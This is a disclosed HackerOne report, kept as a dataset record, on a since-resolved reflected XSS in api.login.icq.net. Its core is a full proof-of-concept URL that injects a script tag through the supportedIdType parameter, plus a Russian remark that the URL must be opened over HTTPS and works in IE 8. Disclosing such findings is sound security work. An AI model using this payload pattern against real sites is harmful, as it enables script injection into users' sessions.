---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '113336'
original_report_id: '113336'
title: '[api.login.icq.net] Reflected XSS'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: mailru
created_at: '2016-01-28T19:40:10.267Z'
disclosed_at: '2017-03-03T13:13:59.288Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [api.login.icq.net] Reflected XSS

## Metadata

- HackerOne Report ID: 113336
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: mailru
- Disclosed At: 2017-03-03T13:13:59.288Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

https://api.login.icq.net/auth/login?doSNSAuth=-1&f=qs&idType=OID&k=ao1-uaRbbNAqtYfG&succUrl=http://c.icq.com/webicq/iconuploader/1/redir.html&supportedIdType=SN"><script>alert(document.domain)</script><a="&doSNSAuth=0

Тонкость: обязательно открывать через HTTPS.

Работает IE 8.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
